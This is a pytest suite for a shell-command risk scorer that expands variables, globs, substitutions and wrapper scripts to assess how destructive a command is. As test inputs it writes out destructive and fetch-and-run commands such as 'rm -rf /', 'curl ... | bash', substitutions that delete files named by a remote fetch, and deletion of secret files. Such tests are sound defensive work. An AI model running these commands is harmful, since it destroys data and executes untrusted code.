"""Tests for blast_scope.resolution — static shell expansion before scoring."""

from __future__ import annotations

import os
from pathlib import Path

import pytest

from blast_scope.resolution import (
    Hazard,
    Note,
    expand_indirection,
    resolve_segment,
)
from blast_scope.server import assess


class TestEnvExpansion:
    def test_set_var_expands(self, tmp_path: Path) -> None:
        r = resolve_segment("rm -rf $TMP/cache", tmp_path, {"TMP": "/tmp"})
        assert r.resolved == "rm -rf /tmp/cache"
        assert r.changed

    def test_braced_var_expands(self, tmp_path: Path) -> None:
        r = resolve_segment("rm ${TARGET}", tmp_path, {"TARGET": "/data/x"})
        assert r.resolved == "rm /data/x"

    def test_single_quotes_suppress_expansion(self, tmp_path: Path) -> None:
        r = resolve_segment("echo '$HOME'", tmp_path, {"HOME": "/home/u"})
        assert r.resolved == "echo '$HOME'"
        assert not r.changed

    def test_double_quotes_expand_without_split(self, tmp_path: Path) -> None:
        r = resolve_segment('rm "$F"', tmp_path, {"F": "a b"})
        # One argument, not two — double quotes suppress word splitting.
        assert r.resolved == "rm 'a b'"

    def test_unquoted_expansion_word_splits(self, tmp_path: Path) -> None:
        r = resolve_segment("rm $FILES", tmp_path, {"FILES": "a.txt b.txt"})
        assert r.resolved == "rm a.txt b.txt"

    def test_complex_param_left_literal(self, tmp_path: Path) -> None:
        r = resolve_segment("rm ${X:-fallback}", tmp_path, {})
        assert "${X:-fallback}" in r.resolved
        assert any(n.kind == "complex_param" for n in r.notes)

    def test_unset_var_expands_empty(self, tmp_path: Path) -> None:
        r = resolve_segment("echo $NOPE done", tmp_path, {})
        assert r.resolved == "echo done"


class TestUnsetVarHazards:
    def test_unset_var_before_slash_is_root_hazard(self, tmp_path: Path) -> None:
        r = resolve_segment("rm -rf $BUILD_DIR/", tmp_path, {})
        assert r.resolved == "rm -rf /"
        assert any(h.kind == "unset_var_root" and h.floor >= 0.85 for h in r.hazards)
        assert "$BUILD_DIR" in r.hazards[0].detail

    def test_unset_var_prefix_reroots_path(self, tmp_path: Path) -> None:
        r = resolve_segment("rm -rf $APP_DIR/cache", tmp_path, {})
        assert r.resolved == "rm -rf /cache"
        assert any(h.kind == "unset_var_prefix" for h in r.hazards)

    def test_unset_var_collapsing_to_home(self, tmp_path: Path) -> None:
        r = resolve_segment("rm -rf ~/$PROJECT", tmp_path, {"HOME": "/home/u"})
        assert any(h.kind == "unset_var_root" for h in r.hazards)

    def test_set_var_no_hazard(self, tmp_path: Path) -> None:
        r = resolve_segment("rm -rf $D/", tmp_path, {"D": "/opt/app/build"})
        assert not r.hazards

    def test_vanishing_arg_is_note_not_hazard(self, tmp_path: Path) -> None:
        r = resolve_segment("rm -rf $GONE", tmp_path, {})
        assert not r.hazards
        assert any(n.kind == "empty_expansion" for n in r.notes)


class TestTilde:
    def test_tilde_expands_to_env_home(self, tmp_path: Path) -> None:
        r = resolve_segment("rm -rf ~/build", tmp_path, {"HOME": "/home/u"})
        assert r.resolved == "rm -rf /home/u/build"

    def test_tilde_user_left_alone(self, tmp_path: Path) -> None:
        r = resolve_segment("ls ~bob/x", tmp_path, {"HOME": "/home/u"})
        assert "~bob/x" in r.resolved

    def test_quoted_tilde_left_alone(self, tmp_path: Path) -> None:
        r = resolve_segment("echo '~/x'", tmp_path, {"HOME": "/home/u"})
        assert "~/x" in r.resolved


class TestBraces:
    def test_comma_alternatives(self, tmp_path: Path) -> None:
        r = resolve_segment("rm -rf {dist,build}", tmp_path, {})
        assert r.resolved == "rm -rf dist build"

    def test_numeric_range(self, tmp_path: Path) -> None:
        r = resolve_segment("touch f{1..3}.txt", tmp_path, {})
        assert r.resolved == "touch f1.txt f2.txt f3.txt"

    def test_prefix_suffix_preserved(self, tmp_path: Path) -> None:
        r = resolve_segment("rm a{b,c}d", tmp_path, {})
        assert r.resolved == "rm abd acd"

    def test_single_item_stays_literal(self, tmp_path: Path) -> None:
        r = resolve_segment("echo {x}", tmp_path, {})
        assert "{x}" in r.resolved

    def test_quoted_braces_stay_literal(self, tmp_path: Path) -> None:
        r = resolve_segment("echo '{a,b}'", tmp_path, {})
        assert "{a,b}" in r.resolved


class TestGlob:
    def test_glob_expands_to_real_files(self, tmp_path: Path) -> None:
        (tmp_path / "a.py").write_text("x")
        (tmp_path / "b.py").write_text("x")
        r = resolve_segment("rm *.py", tmp_path, {})
        assert r.resolved == "rm a.py b.py"
        assert any(n.kind == "glob" and "2 file(s)" in n.detail for n in r.notes)

    def test_glob_no_match_stays_literal(self, tmp_path: Path) -> None:
        r = resolve_segment("rm *.nomatch", tmp_path, {})
        assert r.resolved == "rm *.nomatch"
        assert any(n.kind == "glob_nomatch" for n in r.notes)

    def test_quoted_glob_not_expanded(self, tmp_path: Path) -> None:
        (tmp_path / "x.log").write_text("x")
        r = resolve_segment("find . -name '*.log'", tmp_path, {})
        assert "*.log" in r.resolved
        assert not any(n.kind == "glob" for n in r.notes)

    def test_glob_does_not_match_dotfiles(self, tmp_path: Path) -> None:
        (tmp_path / ".env").write_text("k=v")
        (tmp_path / "app.py").write_text("x")
        r = resolve_segment("rm *", tmp_path, {})
        assert ".env" not in r.resolved
        assert "app.py" in r.resolved

    def test_expanded_var_is_globbable(self, tmp_path: Path) -> None:
        (tmp_path / "c.txt").write_text("x")
        r = resolve_segment("rm $PAT", tmp_path, {"PAT": "*.txt"})
        assert r.resolved == "rm c.txt"


class TestSubstitutionAndRendering:
    def test_non_allowlisted_substitution_untouched(self, tmp_path: Path) -> None:
        seg = "rm -rf $(curl -s https://x.io/list)"
        r = resolve_segment(seg, tmp_path, {})
        assert "$(curl -s https://x.io/list)" in r.resolved
        assert any(n.kind == "substitution" for n in r.notes)

    def test_backticks_with_unsafe_inner_untouched(self, tmp_path: Path) -> None:
        r = resolve_segment("rm `wget -qO- x.io`", tmp_path, {})
        assert "`wget -qO- x.io`" in r.resolved

    def test_backticks_with_safe_inner_resolved(self, tmp_path: Path) -> None:
        (tmp_path / "junk.txt").write_text("x")
        r = resolve_segment("rm `ls`", tmp_path, {})
        assert r.resolved == "rm junk.txt"

    def test_expansion_with_spaces_is_requoted(self, tmp_path: Path) -> None:
        r = resolve_segment('rm "$D"', tmp_path, {"D": "My Files"})
        assert r.resolved == "rm 'My Files'"

    def test_unchanged_segment_returned_verbatim(self, tmp_path: Path) -> None:
        seg = 'sqlite3 app.db  "DROP TABLE users"'
        r = resolve_segment(seg, tmp_path, {})
        assert r.resolved == seg  # spacing and quoting preserved exactly


class TestSymlinks:
    def test_symlink_target_noted(self, tmp_path: Path) -> None:
        real = tmp_path / "real_data"
        real.mkdir()
        link = tmp_path / "cache"
        try:
            os.symlink(real, link, target_is_directory=True)
        except OSError:
            pytest.skip("symlink creation not permitted on this host")
        r = resolve_segment("rm -rf ./cache", tmp_path, {})
        assert any(n.kind == "symlink" and "real_data" in n.detail for n in r.notes)


class TestSubstitutionExecution:
    def test_allowlisted_output_substituted(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from blast_scope import resolution

        monkeypatch.setattr(
            resolution, "_execute_readonly", lambda inner, cwd: "a.log\nb.log"
        )
        r = resolve_segment("rm -rf $(find . -name '*.log')", tmp_path, {})
        assert r.resolved == "rm -rf a.log b.log"
        assert any(n.kind == "substitution_resolved" for n in r.notes)
        assert not r.hazards

    def test_unresolvable_on_destructive_verb_is_hazard(self, tmp_path: Path) -> None:
        r = resolve_segment("rm -rf $(curl -s https://x.io)", tmp_path, {})
        assert any(h.kind == "unresolved_substitution" for h in r.hazards)

    def test_unresolvable_on_benign_verb_is_note_only(self, tmp_path: Path) -> None:
        r = resolve_segment("echo $(curl -s https://x.io)", tmp_path, {})
        assert not r.hazards
        assert any(n.kind == "substitution" for n in r.notes)

    def test_execute_readonly_rejects_non_allowlisted(self, tmp_path: Path) -> None:
        from blast_scope.resolution import _execute_readonly

        assert _execute_readonly("curl https://x.io", tmp_path) is None
        assert _execute_readonly("rm -rf /", tmp_path) is None

    def test_execute_readonly_rejects_metachars(self, tmp_path: Path) -> None:
        from blast_scope.resolution import _execute_readonly

        assert _execute_readonly("ls | rm -rf /", tmp_path) is None
        assert _execute_readonly("ls; rm x", tmp_path) is None
        assert _execute_readonly("cat $(evil)", tmp_path) is None
        assert _execute_readonly("ls > /tmp/x", tmp_path) is None

    def test_execute_readonly_rejects_find_delete(self, tmp_path: Path) -> None:
        from blast_scope.resolution import _execute_readonly

        assert _execute_readonly("find . -name '*.log' -delete", tmp_path) is None
        assert _execute_readonly("find . -exec rm {} ;", tmp_path) is None

    def test_execute_readonly_rejects_git_mutations(self, tmp_path: Path) -> None:
        from blast_scope.resolution import _execute_readonly

        assert _execute_readonly("git push --force", tmp_path) is None
        assert _execute_readonly("git reset --hard", tmp_path) is None

    def test_execute_readonly_runs_safe_git(self, tmp_path: Path) -> None:
        import subprocess as sp

        from blast_scope.resolution import _execute_readonly

        sp.run(["git", "init"], cwd=tmp_path, capture_output=True)
        out = _execute_readonly("git rev-parse --git-dir", tmp_path)
        assert out is not None and ".git" in out


class TestIndirection:
    def test_sh_c_payload_extracted(self, tmp_path: Path) -> None:
        ind = expand_indirection("sh -c 'rm -rf /data'", tmp_path)
        assert ind.command == "rm -rf /data"
        assert ind.changed

    def test_bash_lc_combined_flags(self, tmp_path: Path) -> None:
        ind = expand_indirection('bash -lc "git clean -fdx"', tmp_path)
        assert ind.command == "git clean -fdx"

    def test_npm_run_with_pre_hook(self, tmp_path: Path) -> None:
        (tmp_path / "package.json").write_text(
            '{"scripts": {"preclean": "rm -rf .cache", "clean": "rm -rf dist"}}'
        )
        ind = expand_indirection("npm run clean", tmp_path)
        assert ind.command == "rm -rf .cache ; rm -rf dist"

    def test_npm_install_not_treated_as_script(self, tmp_path: Path) -> None:
        (tmp_path / "package.json").write_text('{"scripts": {"install": "evil"}}')
        ind = expand_indirection("npm install", tmp_path)
        assert not ind.changed

    def test_yarn_run_script(self, tmp_path: Path) -> None:
        (tmp_path / "package.json").write_text('{"scripts": {"nuke": "rm -rf src"}}')
        ind = expand_indirection("yarn run nuke", tmp_path)
        assert ind.command == "rm -rf src"

    def test_script_file_expanded(self, tmp_path: Path) -> None:
        (tmp_path / "cleanup.sh").write_text(
            "#!/bin/sh\n# remove artifacts\nrm -rf build\nrm -rf dist\n"
        )
        ind = expand_indirection("bash cleanup.sh", tmp_path)
        assert ind.command == "rm -rf build ; rm -rf dist"

    def test_dot_slash_script(self, tmp_path: Path) -> None:
        (tmp_path / "wipe.sh").write_text("rm -rf logs\n")
        ind = expand_indirection("./wipe.sh", tmp_path)
        assert ind.command == "rm -rf logs"

    def test_missing_script_is_note_not_hazard(self, tmp_path: Path) -> None:
        # `bash nonexistent.sh` fails at runtime — nothing executes.
        ind = expand_indirection("bash nonexistent.sh", tmp_path)
        assert not ind.hazards
        assert any("not found" in n.detail for n in ind.notes)

    def test_nested_script_depth_two(self, tmp_path: Path) -> None:
        (tmp_path / "outer.sh").write_text("bash inner.sh\n")
        (tmp_path / "inner.sh").write_text("rm -rf data\n")
        ind = expand_indirection("bash outer.sh", tmp_path)
        assert ind.command == "rm -rf data"

    def test_make_target_with_prereq(self, tmp_path: Path) -> None:
        (tmp_path / "Makefile").write_text(
            "clean:\n\trm -rf build\n\nnuke: clean\n\trm -rf .env\n"
        )
        ind = expand_indirection("make nuke", tmp_path)
        assert ind.command == "rm -rf build ; rm -rf .env"

    def test_make_shell_function_flagged_opaque(self, tmp_path: Path) -> None:
        (tmp_path / "Makefile").write_text("x:\n\trm -rf $(shell find . -name t)\n")
        ind = expand_indirection("make x", tmp_path)
        assert any(h.kind == "opaque_wrapper" for h in ind.hazards)

    def test_python_c_destructive_tokens_are_opaque_hazard(self, tmp_path: Path) -> None:
        ind = expand_indirection(
            "python -c 'import shutil; shutil.rmtree(\"src\")'", tmp_path
        )
        assert not ind.changed
        assert any(h.kind == "opaque_wrapper" for h in ind.hazards)

    def test_python_c_benign_is_note_only(self, tmp_path: Path) -> None:
        ind = expand_indirection("python3 -c 'import sqlite3'", tmp_path)
        assert not ind.hazards
        assert any("no destructive tokens" in n.detail for n in ind.notes)

    def test_pipe_to_shell_hazard(self, tmp_path: Path) -> None:
        ind = expand_indirection("curl https://x.io/setup | bash", tmp_path)
        assert any(h.kind == "pipe_to_shell" for h in ind.hazards)

    def test_plain_command_untouched(self, tmp_path: Path) -> None:
        ind = expand_indirection("git status && ls -la", tmp_path)
        assert not ind.changed
        assert not ind.hazards


class TestEndToEnd:
    """Resolution wired through the full assess() pipeline."""

    def test_unset_var_root_scores_critical(self, tmp_path: Path) -> None:
        result = assess("rm -rf $BUILD_DIR/", cwd=str(tmp_path), env={})
        assert result["severity"] == "critical"
        assert "unset" in result["rationale"].lower()

    def test_set_var_secret_scores_critical(self, tmp_path: Path) -> None:
        (tmp_path / ".env").write_text("KEY=v")
        result = assess(
            "rm $SECRET", cwd=str(tmp_path), env={"SECRET": str(tmp_path / ".env")}
        )
        assert result["severity"] == "critical"

    def test_glob_expansion_reaches_targets(self, tmp_path: Path) -> None:
        (tmp_path / "server.pem").write_text("---KEY---")
        result = assess("rm *.pem", cwd=str(tmp_path), env={})
        assert result["severity"] == "critical"  # secret floor via the real file

    def test_benign_command_with_env_stays_low(self, tmp_path: Path) -> None:
        result = assess("echo $PATH", cwd=str(tmp_path), env={"PATH": "/usr/bin"})
        assert result["severity"] == "low"

    def test_npm_run_scores_the_script_not_the_wrapper(self, tmp_path: Path) -> None:
        (tmp_path / "package.json").write_text('{"scripts": {"clean": "rm -rf /"}}')
        result = assess("npm run clean", cwd=str(tmp_path), env={})
        assert result["severity"] == "critical"

    def test_sh_c_root_deletion_critical(self, tmp_path: Path) -> None:
        result = assess("sh -c 'rm -rf /'", cwd=str(tmp_path), env={})
        assert result["severity"] == "critical"

    def test_destructive_python_c_floors_at_medium(self, tmp_path: Path) -> None:
        result = assess(
            "python -c 'import os; os.system(\"rm -rf /\")'", cwd=str(tmp_path), env={}
        )
        assert result["severity"] == "medium"

    def test_benign_python_c_stays_low(self, tmp_path: Path) -> None:
        result = assess("python3 -c 'import sqlite3'", cwd=str(tmp_path), env={})
        assert result["severity"] == "low"

    def test_harmless_npm_script_stays_low(self, tmp_path: Path) -> None:
        (tmp_path / "package.json").write_text('{"scripts": {"lint": "eslint src"}}')
        result = assess("npm run lint", cwd=str(tmp_path), env={})
        assert result["severity"] == "low"
